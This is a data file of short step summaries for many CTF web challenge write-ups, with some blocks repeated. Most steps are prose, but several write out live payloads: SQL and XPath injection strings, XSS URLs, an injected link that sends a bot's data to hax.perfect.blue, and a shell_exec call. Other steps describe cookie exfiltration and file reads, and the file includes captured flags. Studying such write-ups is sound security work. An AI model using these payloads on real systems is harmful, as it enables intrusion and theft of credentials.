    "Altered the 'not_admin' cookie's value from '1' to '0'",
    "Refreshed the webpage to retrieve the flag",
    "Analyzed the cookies and found a base64 encoded value",
    "Decoded the base64 value to get the text 'cat index.txt'",
    "Attempted a command injection via the cookie to generate more base64 cookies",
    "Injected the base64 version of the bash script to enumerate the folder content",
    "Found a 'flag' file in the folder content",
    "Printed the 'flag' file content using a bash script, encoded it via Base64 and passed it into the cookie",
    "Retrieved the flag from the decoded base64 response",
    "Access the provided URL: http://highsource.tuctf.com/",
    "Examine the page's source code and find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Retrieve and analyze the JavaScript file from the webpage.",
    "Discover a hardcoded password within the JavaScript file: 'I4m4M4st3rC0d3rH4x0rsB3w43'.",
    "Return to the website and login using the found password.",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Visited the website and analyzed the webpage's HTML and JavaScript code",
    "Discovered that the chat functionality was vulnerable to HTML tag injection - messages were not being escaped",
    "Performed a basic analysis of the cookies and found a 'secret' cookie",
    "Set up a listening server using 'netcat'",
    "Crafted an HTTP request to the chat endpoint with the aim of stealing the VIP user's cookies",
    "Inserted an image reference with an 'onerror' attribute to trigger JavaScript code to send the document cookies to an attacker-controlled server",
    "Observed incoming requests on the server set up in step 4",
    "Identified incoming cookies from the victim's browser carrying the 'secret' cookie, which contained the flag",
    "Accessed the target website, which was a login form",
    "Identified that the website was vulnerable to SQL injection",
    "Tested and confirmed the SQL injection vulnerability by entering ' or '1'='1 as the payload",
    "Realized password was the flag, thus decided to use the SQL LIKE clause to discover each character of the password one at a time",
    "Sent a POST request to the server with a payload that used the SQL LIKE clause",
    "Using the information obtained from the previous step, constructed a Python script to automate the process of discovering the next character in the password by sending POST requests with a payload that uses the SQL LIKE clause for each possible character",
    "Ran the script until the flag (password) was fully discovered",
    "Read challenge and note hints about versioning control systems, specifically git",
    "Try to access `http://3.91.17.218/.git/` but encounter HTTP `403 Forbidden` response",
    "Examine main web page source code, find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`",
    "Identify Base64 encoded string `aW1nMS5qcGc=` as `img1.jpg`",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read",
    "Test LFI vulnerability by Base64 encoding `index.php` and `getimg.php`, and using these as parameter values for `getimg.php`",
    "Reveal the source code of both `index.php` and `getimg.php`",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory",
    "Pull `.git/index`, `.git/config`, `.git/HEAD`, `.git/refs/remotes/origin/master`, `.git/refs/heads/master`, `.git/logs/HEAD` from the server",
    "Examine the `.git/logs/HEAD` file to find commit IDs and determine when the flag was removed from the source",
    "Use the commit IDs to fetch further git objects from the server",
    "Fail to restore source code due to missing git objects",
    "Discover the missing git objects by trying to checkout the master branch",
    "Fetch the missing git objects from the server",
    "Successfully restore the source code files on local machine",
    "Attempt to show differences between the commit when the flag was removed and the commit when it was present",
    "Encounter additional missing git objects",
    "Fetch further missing git objects from the server",
    "Successfully display the differences between the two git commits and thus retrieve the flag",
    "Inspect the webpage and discover it uses XML envelopes via two JavaScript files when buttons are pressed",
    "Identify a javascript file responsible for crafting the XML envelope",
    "Identify a second javascript file that sends the XML envelope and reads the answer",
    "Notice that a normal interaction involves passing a productId value, which the server reflects in the response",
    "Test the system's reaction to an invalid productId value",
    "Understand that due to the parameter being reflected in the response, the system may be susceptible to XXE attacks",
    "Create a crafted payload utilizing XXE to attempt reading a file from the server",
    "Send the payload",
    "Receive a response that contains data from the /etc/passwd file, indicating successful exploitation of an XXE vulnerability",
    "Observe the flag utflag{n3xt_y3ar_go1ng_bl1nd} found in the returned data",
    "Inspect the webpage and discover it uses XML envelopes via two JavaScript files when buttons are pressed",
    "Identify a javascript file responsible for crafting the XML envelope",
    "Identify a second javascript file that sends the XML envelope and reads the answer",
    "Notice that a normal interaction involves passing a productId value, which the server reflects in the response",
    "Test the system's reaction to an invalid productId value",
    "Understand that due to the parameter being reflected in the response, the system may be susceptible to XXE attacks",
    "Create a crafted payload utilizing XXE to attempt reading a file from the server",
    "Send the payload",
    "Receive a response that contains data from the /etc/passwd file, indicating successful exploitation of an XXE vulnerability",
    "Observe the flag utflag{n3xt_y3ar_go1ng_bl1nd} found in the returned data",
    "Analyzed the HTML source code to discover an interesting comment (?source=1)",
    "Entered ?source=1 as an HTTP parameter to retrieve the PHP source code",
    "Identified a potential SQL injection vulnerability",
    "Reviewed online documentation to understand how MySQL executes query portions inside comments",
    "Constructed a base to perform SQL injection",
    "Executed an HTTP request using the base constructed, trying to enumerate DB tables",
    "Identified a flag table in the database",
    "Used the SQL injection to enumerate the columns of the flag table",
    "Discovered a column named 'whatsthis'",
    "Executed another HTTP request to extract the content of the 'whatsthis' table",
    "Retrieved the flag from the table content",
    "Analyzed the HTML source code to discover an interesting comment (?source=1)",
    "Entered ?source=1 as an HTTP parameter to retrieve the PHP source code",
    "Identified a potential SQL injection vulnerability",
    "Reviewed online documentation to understand how MySQL executes query portions inside comments",
    "Constructed a base to perform SQL injection",
    "Executed an HTTP request using the base constructed, trying to enumerate DB tables",
    "Identified a flag table in the database",
    "Used the SQL injection to enumerate the columns of the flag table",
    "Discovered a column named 'whatsthis'",
    "Executed another HTTP request to extract the content of the 'whatsthis' table",
    "Retrieved the flag from the table content",
    "Analyzed the website behavior and noticed that an idea can be posted with an assigned ID that can be voted on.",
    "Examined HTML source code to understand the layout and elements of the webpage and its voting system.",
    "Reviewed JavaScript 'index.js' to understand the methods used for voting.",
    "Identification of a voting procedure challenge that requires solving. A string has to be found so that the MD5 hash of this string exactly matches the challenge.",
    "Noticed that each challenge string must be found every time it is called, which can be optimized.",
    "Wrote a script to use a cache which stores all attempts for generating the challenge strings.",
    "Implemented a smart voter script that utilizes a previously saved cache. This minimizes the time spent on creating strings that match the challenge given by the server.",
    "Script causes browser to begin voting process. Process continues until more than 250 votes are cast during the same PHP session.",
    "Observed that obtaining the flag message requires waiting for a response from the server after each vote.",
    "After reaching 250 votes, flag message is returned by the server.",
    "Analysed the HTML code revealing the CAPTCHA checkbox which generates random string.",
    "Understood from the provided python code that username and password are 'backd00r' and 'catsrcool' respectively.",
    "Discovered from the python code that there is a debugging private key for testing: '8EE86735658A9CE426EAF4E26BB0450E', which is the MD5 of the string: 'fuckingdog'.",
    "Manipulated the link used in the requests.get operation via CAPTCHA parameter, excluding the existing private key parameter through '#' and forced the debugging private key.",
    "Formulated a payload, which excluded the existing private key and forced the debugging private key.",
    "Formulated a HTTP request using the payload and made a 'POST' call.",
    "In the HTTP Response, found a redirection URL.",
    "Upon redirection, found a webpage that contained three files.",
    "Inside one of the files, '(wtf.mp4)', discovered the flag in reversed order.",
    "Download the source code attached to the CTF challenge.",
    "Review the given source code, which is a Javascript calculator web app.",
    "Identify the constraints: the payload must be less than 30 characters and cannot contain 'zer0pts'.",
    "Recognize this as a code injection challenge.",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Identify that output content being checked for the presence of the string 'zer0pts', and devise a method to bypass it.",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Create a payload that would fit the constraints and retrieve the flag.",
    "Summarize that the flag must be 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}'.",
    "Downloaded and analyzed website source code",
    "Discovered 'Report Vulnerability' message requiring a reflected XSS exploit",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Attempted payload to inject XSS via `theme` failed due to Content Security Policy",
    "Tried to bypass CSP to inject XSS",
    "Discovered a script on the `index.php` page calling `api.php` endpoint",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Used DOM Clobbering technique to redefine `window.callback` and `trustedTypes`",
    "Injected payload for basic XSS execution with DOM Clobbering",
    "Decided to use the `jsonp` method itself to perform cross-origin request",
    "Created two endpoints, `/evil/` for cookie grabbing script and `/cookie/` for receiving exploited cookies",
    "Injected final payload to initiate the XSS to send the cookies from the server to the `/cookie/` endpoint",
    "Decoded the base64 encoded flag from the cookies received",
    "Started the CTF challenge with a note stating 'under protection' indicating the platform has some security measures",
    "Suspected it had something to due with security protections such as a WAF after noting the title 'advertisement' and the presence of protected DIG records",
    "Suspected it could be related to Cloudflare protections after examining DIG records",
    "Considered triggering a custom Cloudflare error, but didn't know how to do it",
    "Recalled an example from a known website (crunchyroll.com) where a Cloudflare error was triggered by SQL injection",
    "Tried using an SQL injection on the challenge platform (inputting ' OR 1=1--')",
    "Received a custom error with the flag as a response, resulting in successful completion of the challenge",
    "Started the challenge by finding the /login/ endpoint and a www.zip file using dirsearch",
    "Opened the www.zip file to find the source code of the web app",
    "Identified the login process in the file bookhub/forms.user.py",
    "Noticed the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled. Found that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address",
    "Added the header X-Forwarded-For, but got an error message that the IP address was not in the whitelist",
    "Suspected a reverse proxy might be stripping the X-Forwarded-For header",
    "Did a nmap scan on IP 18.213.16.123 which was not a local IP",
    "Opened http://18.213.16.123:5000/ and found out the web app run in the debug mode",
    "Identified some extra code for the debug mode in the bookhub/views/user.py file",
    "Discovered a bug in the /admin/system/refresh_session/ endpoint which could be accessed without authentication",
    "Identified there is a potential for a redis injection flaw in the refresh_session() function, where the user's sessionID is used in a redis eval() call with a lua script",
    "Duplicated the server environment and set up a redis server to construct an exploit",
    "Revealed that session data is stored as a serialized pickle python object, which could potentially be exploited for a pickle deserialization vulnerability",
    "Created a script which modified sessionID to valid lua, refreshed the CSRF token and sent a POST request to the /admin/system/refresh_session/ endpoint",
    "Constructed a payload to do a redis.call() to set the serialized object with the sessionID and made a GET request to /login/ to trigger the deserialization",
    "Created a final script to send the command for flag extraction to the server",
    "Opened the provided URL which returned a page that accepts another URL and submits it.",
    "Observed possibility of XSS attack from bot's lens when it visits the URL provided on the page.",
    "Analyzed the source code of the page and identified JavaScript functions that handle creation of iframe or appending script source, and a message event listener that conducts some checks on iframe data from URL.",
    "Understood that the challenge is to pass checks where there should not be any dots, double slashes or non-ascii dot in the iframe value in the url.",
    "Noticed a flaw in check condition where it checks if iframe is not an object instead of checking if iframe value is not an object.",
    "Created a payload that doesn't have dots or double slashes. This is done using data URI in the form 'data:text/html;base64,<base64 data>'.",
    "The base64 data encodes an XMLHttpRequest which retrieves document's cookie and sends to a specified server.",
    "Payload is structured in JSON and added to the URL after first  '?' character.",
    "Submitted the URL so that it is visited by the bot.",
    "Received the flag in server logs as a cookie in the HTTP GET request.",
    "Given a simple Web server written in Python, handling only GET and POST requests with files",
    "Developed a suspicion of a directory traversal vulnerability either in the GET path handling or the POST filename",
    "Added debug prints to the file for the GET path and POST filename to confirm the suspected vulnerability",
    "Confirmed that there was a directory traversal vulnerability in the POST filename",
    "Used the discovered vulnerability to write a request to the root directory with the filename 'lol.txt' and the content 'HACKED'",
    "Looked for files that could be overwritten, but couldn't modify anything in '/home/manhndd/.ssh/' due to a lack of appropriate permission",
    "Decided to overwrite '.bashrc' file, which would execute when the user 'manhndd' SSH-es into the server",
    "Race with other players in the game to overwrite '.bashrc' file with their payload",
    "Due to the absence of 'nc' and any way to exfiltrate the flag, read the flag from '/var/secret' and write it to '/opt/mydank', wherein '/opt' is the web facing directory",
    "Spammed 'Go' on Burp's repeater to send the request and concurrently wrote a Python script to read from '/mydank'",
    "Finally, managed to win the race and acquire the flag",
    "Visited the site and analysed the given hyperlinks.",
    "Investigated behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Concluded that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Confirmed suspicion about server behaviour by setting up a wildcard DNS listener. Request to '/pleb.mysub.dnsbin.zhack.ca' returned DNS query for example.com.",
    "Used nip.io wildcard DNS service to exploit the redirection behaviour. Request to '/pleb.127.0.0.1.nip.io' returned localhost.",
    "Accessed the 'user' directory and found an oddly-named nginx.conf file.",
    "Set up a listener and found that the '/pleb' proxy wasn't forwarding non-ASCII characters.",
    "Used double URL encoding to bypass the character restriction and download the nginx.conf file successfully.",
    "Analysed the downloaded nginx.conf file and found that it uses proxy_pass to forward requests.",
    "Leveraged X-Accel-Redirect, which enables access to the internal directive by acting as a rewrite rule, to access the '/admin' directory.",
    "Set up a PHP script on '/pleb.my.ip.nip.io' that returned the X-Accel-Redirect header, revealing the '/admin' directory's contents.",
    "Found a flag.txt file in the '/admin' directory, but it was a misdirection towards '/useradmin'.",
    "Chose to target the '/uberadmin' directory next. Found a potential Off-by-Slash bug where nginx concatenates alias directives with location directives.",
    "Used the X-Accel-Redirect PHP script to create a request for '/admin../uberadmin/flag.txt'. This exploited the Off-by-Slash bug and returned the real flag in the 'uberadmin' directory.",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge which involves exploiting a page to pop up an alert.",
    "Analyze the source code of the webpage, noticing it is a 'Markdown' converter that uses regex.",
    "Recognize that all open HTML tags '<' have been removed, making a traditional XSS attack impossible.",
    "Identify a specific replace function that changes markdown format images into HTML image tags, but does not sanitize the 'alt' parameter.",
    "Decide to exploit the unsanitized 'alt' parameter by injecting a double quote to break out of the alt tag, followed by a JavaScript event handler for the XSS.",
    "Create and test the final URL 'http://marcodowno-01.play.midnightsunctf.se:3001/markdown?input=[\" onerror=\"alert(1)\"](http://x)' to trigger the XSS alert attack.",
    "Read the problem's given details and description, identified it's a Web category challenge, with a goal to perform an XSS attack and make a URL to trigger alert(1) for getting the flag",
    "Examined the provided source code which uses a markdown library to convert markdown into HTML, runs DOMPurify, and does some validation",
    "Noticed DOMPurify is applied on HTML, but acknowledged that DOMPurify is pretty secure, and it's unlikely they want me to find a vulnerability in it",
    "Saw a statement on DOMPurify's GitHub indicating that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS",
    "Recognized from the source code that it is using jQuery's html() method without using the SAFE_FOR_JQUERY flag, hinting that XSS might be possible in this case",
    "Started looking for a payload to trigger the XSS, looked at the unit tests for the SAFE_FOR_JQUERY flag on the DOMPurify's GitHub",
    "Found a section in DOMPurify's unit tests where they tested payloads that can cause XSS if used with jQuery's html() method",
    "Tested payloads from the unit test in the challenge, the third payload ended up triggering an alert, indicating a successful XSS attack",
    "Created a URL with the successful payload and upon submitting it, received the flag",
    "Identified that the challenge is written using the mermaid library",
    "Searched for a way to embed an image into a mermaid flowchart",
    "Ensured that a valid graph could be created using a specific format",
    "Attempted to inject code with an embedded script, but it failed",
    "Realized that the method failed due to the JavaScript trying to parse parentheses",
    "Learned that backticks (`) could be used instead of parentheses in JavaScript",
    "Created a working script by replacing parentheses with backticks",
    "Submitted the script in the URL to obtain the flag",
    "Visited the CTF challenge site to analyse the form provided to upload images.",
    "Checked the robots.txt on the site to examine the source.zip that reveals all the source code.",
    "Downloaded the source.zip file and opened it to find upload.php, which is the relevant code.",
    "Immutable code inspection of upload.php helped to figure out there's an XML External Entity (XXE) vulnerability when it loads SVG files.",
    "Identified that in the php code, there were serialization in the __construct and __destruct methods.",
    "Hosted a document type definition (DTD) on a personal domain for blind exfiltration of files.",
    "Used the PHP /// uri with their base64 encoding filter to allow for file reading.",
    "Identified that I need to use the phar:// uri in the XML External Entity vulnerability to make PHP deserialize my object of the Image type.",
    "Understood that I need to create a controlled filename and when __destruct would be called. This would lead to a command execution in the create_thumb function.",
    "Used a techinique to disguise a valid phar file as a JPEG image.",
    "Uploaded the disguised phar file and used the XML External Entity vulnerability to call it with the phar:// uri.",
    "Created a phar that when unserialized, it created an Image object with a controlled filename which would execute the command './flag_dispenser' when the __destruct method was called.",
    "Command execution triggered execution of the flag_dispenser to get the flag.",
    "Identified a Server Side Request Forgery (SSRF) vulnerability in the /api/image to FTP server",
    "Used Carriage Return Line Feed (CRLF) injection in the username to inject ftp commands",
    "Uploaded a file into the FTP server using the profile picture upload feature",
    "Used PORT ftp command to SSRF to rabbitmq http API (utilized REST to discard the png header from the uploaded file)",
    "Injected email queue in rabbitmq with an 'attachment' parameter to trigger an email with the flag as content",
    "Accessed site at :5555",
    "Logged in with user credentials",
    "Accessed migrate.php",
    "Entered new user_id and password",
    "Accessed site at :7777",
    "Logged in with new user_id and password",
    "Detected SQL injection vulnerability on INSERT statement",
    "Initiated data leaking process",
    "Leaked data byte-by-byte by hashing it and using as password for new account",
    "Bruteforced password at :7777 to determine the leaked byte",
    "Cycled between accounts due to 1 minute delay in database reset on new site",
    "Ran brute.py script to output arbitrary SQL queries",
    "Dumped all tables and columns",
    "Retrieved the flag",
    "Identified that control over 'request.body.converter' can be achieved",
    "Implemented '__defineSetter__' on 'converters' using sessionID as the first parameter along with an object resolving as a promise",
    "Set 'flagConverted' on the previously set sessionID, causing the promise to resolve",
    "Triggered an error that resulted in the printing of the flag",
    "Identified that 'basename()' function ignores invalid characters in the PHP script",
    "Understood that the invalid characters help bypass the regex validation in the PHP script",
    "Came up with a URL payload that includes the path '/index.php/config.php/%ff?source' to exploit the 'basename()' function while bypassing the regex validation",
    "Sent the final payload URL as a request to the server at 'http://18.179.178.246:8003'",
    "Used the php bug to bypass strip_tags and inject an 'a' tag.",
    "Injected an 'a' tag with the id=like since the bot clicks this element.",
    "Flag was in the user agent so bot clicking our link gave us the flag.",
    "Injected the following code to make the bot click our link and reveal the flag: [[lol\"></audio><a/udio id=\"like\" href=\"http://hax.perfect.blue:6969/lel\">HAXXX<audio src=\"]]",
    "First, an SQLite injection is identified that can be made in the form of create table statement, with limit of 32 characters.",
    "A function is found in the code which validates the string of injection and it must not contain any element of a list of banned words including certain special characters.",
    "A restriction bypass is found using a \"CREATE TABLE ... SELECT\" SQL statement which can transfer the results from the select statement into a new table.",
    "Necessary adjustments are made to the injection to fit the limitations, wrapping unnecessary parts of the query in [] to create a valid query.",
    "Finally, the entire query is compiled and executed.",
    "Connect to given website link (http://3.112.91.135/)",
    "Observed a post message which mentions an FBI DB dump at https://tinyurl.com/fbi-hack and contains a tripcode",
    "Researching online, find that the tripcode is generated from a snippet of futaba-ng code",
    "From the code snippet, learn that the tripcode is a part of an encrypted string composed of remote IP address, a seed (IDSEED), and current date",
    "Set IDSEED with 'idの種' as given in the code",
    "Infer that IP address has prefix 219 as suggested by the hint and tripcode is 'ueyUrcwA'",
    "Assuming the posting date as the current date, write a PHP script that brute force all possible remaining octets of the IP address within the range of 0 to 256",
    "In the script, generate a tripcode for each possible IP and compare it with the target",
    "Run the brute force PHP script",
    "When the correct tripcodes match, retrieve the corresponding IP address and form the flag",
    "Identified a normal SSRF in curl",
    "Exploited SSRF to gain access to NFS filesystem",
    "Created a symlink on the NFS filesystem using the SSRF exploit",
    "Utilized the SSRF exploit to write to the created symlink, overwriting the index.html file",
    "Flipped one random bit in the wordpress installation",
    "Flipped the comparison check in /var/www/html/wp-includes/user.php at position 5389 to always allow login even with incorrect password",
    "Logged in as admin",
    "Uploaded PHP shell",
    "Read the flag",
    "Analyzed a simple PHP script using YAML",
    "Understood that if the IP is from Norway, YAML parses 'NO' as False, allowing us to bypass escapeshellargs",
    "Performed a command injection into the vulnerable points in the script",
    "Exploited the vulnerability to access unauthorized data or perform unauthorized actions",
    "Used lesscss to evaluate CSS on the backend and read arbitrary files with @import (inline) \"/etc/passwd\";",
    "Leaked source code;",
    "Used interp to evaluate Golang at runtime from cookie;",
    "Controlled 'Version' in cookie to get arbitrary code execution;",
    "Realized 'os.exec' is blocked, therefore used 'os.StartProcess' instead;",
    "Imported 'io/ioutil' and 'os';",
    "Created a function named 'api' which reads the file 'satellite.txt';",
    "Defined 'os.ProcAttr' and assigned file descriptors for standard input, output and error handling;",
    "Started a new process to execute '/bin/sh' with argument to read flag file and redirect the output to '/tmp/jizz';",
    "Waited for the process to complete and returned the content of 'satellite.txt'.",
    "Web server is vulnerable to CVE-2022-26377, enabling Request Smuggling to send AJP Requests",
    "Crafting an AJP request based on a writeup to leak the source code (index.jsp)",
    "Index.jsp reveals that a specific IP address (119.29.29.29) response triggers display of the system environment flag",
    "Crafting another request setting the remote_addr to the required fake address",
    "Sending the crafted request to the server to return the system flag",
    "Using an exploit script to generate the payload",
    "Sending the payload to the server using curl command",
    "Access the provided URL using a web browser",
    "The URL leads to a file containing the flag",
    "Display the contents of the file to retrieve the flag.",
    "Decode the jwt cookie using 'JsonCookies' to create a json object",
    "Pass the decoded cookie directly to the 'app.render' function as the options",
    "Set the 'view options' setting and run arbitrary javascript with the 'outputFunctionName' option",
    "Run command line script using curl to set up a request with malicious cookie data to execute child process for reading the flag file",
    "The email's input validation was bypassed through injection, as it only required the email to start validly, allowing any characters afterwards",
    "A negative 'rate' value was inputted when updating the status to bypass the duration check",
    "Arbitrary HTML was injected, which would be rendered by pdfkit/wkhtmltopdf",
    "An iframe was injected, with the 'src' set to local files. This enabled a leak of the secret key '19eb794c831f30f099a31b1c095a17d6' from the 'config.py'",
    "The leaked secret key was then used to fake a session with 'is_admin' privileges, which allowed for reading the flag",
    "Identified the challenge as an XPATH injection challenge",
    "Decided to find a paper that was not published",
    "Created an XPATH injection payload",
    "Inserted the payload into the target site's URL",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack",
    "Recognize the calculator app filters out potential XSS attacks",
    "Analyze 'calc.js' and identify controllable variables",
    "Identify ability to control 'astProgram.type' variable which sets the type attribute for the script element",
    "Decide to provide code JSON, which 'JSON.parse()' will then parse",
    "Switch 'astToJs' to 'evalCode' in order to execute custom code within the app",
    "Decide to use Import Maps to switch 'astToJs' to 'evalCode'",
    "Create a new HTML script element with id 'program', language 'json', and type 'importmap'",
    "Inside the new HTML script element, add an 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Add custom JavaScript code to the 'code' key in order to leak the cookie, and provide an empty array for 'variables'",
    "Execute a Python script (solve.py), eventually obtaining the flag",
    "Use /apisix/batch-requests to SSRF to localhost only admin endpoint with the hardcoded key",
    "Use CRLF injection in Lua's HTTP library to bypass the X-Real-IP protection",
    "Analyze the given server.py file to understand the workflow of the Flask web server.",
    "Identify a potential vulnerability in the 'query_login_attempt' function.",
    "Use an empty username and arbitrary password to exploit the vulnerability and log in to the system.",
    "Identify a second vulnerability in 'query_kill_time', which is a SQL Injection. However, there is a WAF 'Skynet' filtering the requests.",
    "Encode the SQL injection payload into 'multipart/form-data', thereby bypassing WAF 'Skynet'.",
    "Execute SQL injection to manipulate the query and fetch data using union operation.",
    "Discover the flag in the 'target_credentials' database, under the 'secret_key' column, which is 'rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}'.",
    "Checked 'req.files' in check.js but 'next()' was called in each iteration causing express to continue",
    "Uploaded a large number of valid files and manipulated 'app.post('/upload' to process with invalid 'req.files[req.query.formid]'",
    "Uploaded .htaccess file using previous step's vulnerability.",
    "Used 'Redirect 307' to read arbitrary files, such as '/etc/passwd'.",
    "Read the 'apache.conf' and highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Combined output filter with 'SetEnv LD_PRELOAD' to execute code when running gzip",
    "Referenced 'solv.py' to finalize the solution",
    "Examined provided source code of the website which only signed PDF files if they contained 'ECHO' in the text",
    "Identified that the 'openssl_verify' is the function used to sign the PDF files",
    "Understood that the default signature algorithm for the openssl_verify function is SHA1, which has been broken for PDFs",
    "Used SHATTERED to exploit the SHA1 vulnerability and create two PDFs with the same SHA1 hash",
    "Uploaded the first PDF and used the website to sign it",
    "Used the signature from the first PDF on the second PDF",
    "The server recognized the signature and provided the flag",
    "Visited the targeted website, which contained a PHP eval function.",
    "Encountered challenges with navigating up directories due to the `basedir` restriction.",
    "After a break, returned to the problem with a clearer perspective.",
    "Investigated the source code of the website looking for any unusual strings.",
    "Noticed that `shell_exec` was mentioned on the website.",
    "Guessed that `shell_exec` might be allowed on the website.",
    "Ran `echo shell_exec(\"../flag\");` on the website.",
    "Command executed successfully, leading to the conclusion that the problem might have been misconfigured.",
    "Obtained the flag.",
    "Logged into the website using provided credentials and encountered a message saying browser is unsupported",
    "Moved into burp suite and logged in to investigate any intermediate requests",
    "Noticed a 302 found page containing some HTML and JavaScript",
    "Identified a scoped style attribute and a `navigator.battery.charging call` in the JavaScript",
    "Deduced that style scoped only works in Firefox versions 21-54",
    "Brute-forced user-agent strings in burp suite according to the above conclusion, specifically using version 43.0",
    "Successfully extracted the flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment",
    "The challenge offered a shared object entitled `shellme.so` and a website",
    "By appending `?source` to the index.php of the site, the source code was made visible",
    "The source code shows when a GET request is sent with 'source' as a parameter, it reveals the source code of the file",
    "Source code also shows if a POST request is made with 'shell' as a parameter, it echoes the input and sends it to the `shellme()` function, as long as it keeps a 1000 characters limit",
    "Given function `shellme()` gets defined in the shared object `shellme.so`",
    "In the shared object file `shellme.so`, the function `shellme()` gets tracked, leading to a function `shell_this()`, where the given input copies to a mmap-ed memory region",
    "It puts a `SECCOMP_MODE_STRICT` seccomp sandbox into play before executing the input, allowing only read, write, and exit syscalls",
    "It notes that the function uses strlen(), which will truncate any shellcode at null bytes",
    "The PHP code reveals a connection to the MySQL server before executing the shellcode",
    "The description of the challenge clarifies that the flag is in the MySQL 'flag' table",
    "This means the File Descriptor (FD) for connection to MySQL server is open before executing shellcode, so SQL queries can be sent to it and get the response read",
    "Given that the server runs php-cgi, to conduct the MySQL query, a php-cgi header has to first be written",
    "Then the SQL query has to be sent to the File Descriptor (FD) 4 ( MySQL server ), then the response has to be read as it is received, and lastly, the received response has to be written to stdout",
    "Forming the MySQL query following the MySQL docs under the protocol level results in the following: little-endian, 4 bytes, the length of the written query, a 1-byte query type (0x3 for this query), followed by the query itself",
    "The goal consists of writing the cgi header (Content-type: text/html), sending the SQL query to the FD 4 (MySQL server), reading the response from this FD, and finally, writing the received response",
    "A Python-based environment was set up to assemble and debug a shellcode",
    "The shellcode used JMP - CALL - POP technique to get the strings in registers",
    "At the same time, relative JMPs were turned into PLT type trampolines to avoid big JMPs with null bytes-NOP Sled to gracefully handle oversized jumps",
    "The shellcode was created and verified with no NULL bytes, to operate as expected with the `strlen()` function of the 'shellme()' function inside the `shellme.so` file",
    "Once verified and assembled, the shellcode was executed to obtain the desired output - 'Content-type: text/html' cgi header, SQL query sent to the FD 4, read the response from FD 4, write this response",
    "Opened the CTF challenge and read the initial text",
    "Tried submitting possible answers using wordplay with no success",
    "Decided to open the Network tab on the Google Chrome console to see backend activity",
    "Found a JSON response with a message hinting that the flag was already visible",
    "Understood from the JSON response that the flag was in the comment within the response itself",
    "Submitted the flag present in the JSON response",
    "Analyze the challenge which includes a text input for HTML notes and a rendered HTML page from textarea inside an iframe",
    "Take note of the embedded iframe within the same origin where the data is sanitized by DOMPurify",
    "Understand that the challenge is to bypass the script inside the iframe which validates the origin and ID of the message before rendering the body content",
    "Identify the need to steal the identifier and the saved note from the main page using a valid identifier",
    "Understand that the challenge is referring to Same-Origin XSS attack",
    "Observe from user session that the identifier is stored and the session cookie was set to Lax",
    "Acknowledge that the challenge is to bypass origin check by embedding the iframe and forcing a 'null' origin",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes, unless 'allow-popups-to-escape-sandbox' is set",
    "Open a pop-up to the target URL from a sandboxed page, thus causing the pop-up to inherit the sandboxed attributes",
    "From another 'null' origin, send an XSS to the pop-up and steal the identifier",
    "Open the target URL and send an XSS with the stolen identifier so that the origin is the target URL",
    "Implement the series of steps in a Proof of Concept script",
    "Opened the webpage",
    "Right clicked on the webpage and selected 'Inspect' or 'Inspect Element'",
    "Navigated to 'Sources' tab in the Inspect Element tool",
    "Explored the visible scripts and source code files",
    "Found the flag in the source code",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Encode the JWT by setting the algorithm to 'none'",
    "Send the malicious JWT to the server",
    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "An initial inspection of the webpage to understand its functionality",
    "Identification of two endpoints `/getflag` and `/cookies`",
    "Visiting the `/cookies` endpoint to display current cookies",
    "Notice a particular cookie: `user_DE7aL1xDCe3BauCWqSVqg_0C5bu2078UgQHIqYsF2h0= 311` which is valid in JavaScript",
    "Used this script on the prepared website: `<script src='https://cookiemonster.2019.chall.actf.co/cookies'></script>`",
    "Reading the window variable using JavaScript to find admin cookie: `var name = Object.getOwnPropertyNames(window).filter(x=>x.indexOf('admin')!=-1)[0];`",
    "Capture admin's cookie: `admin_GgxUa7MQ7UVo5JHFGLbqzuQfFFy4EDQNwZWAWJXS5_o=`",
    "Submitted the admin's cookie to get the flag: **actf{defund_is_the_real_cookie_monster}**",
    "Recognize that the page allows you to upload a custom HTML page and report suspicious URLs to the admin",
    "Identify that the <script>alert('pwned')</script> won't be executed because of the DOMValidator.js script",
    "Realize that this JS file calculates some sort of document's hash and then compares it with the original",
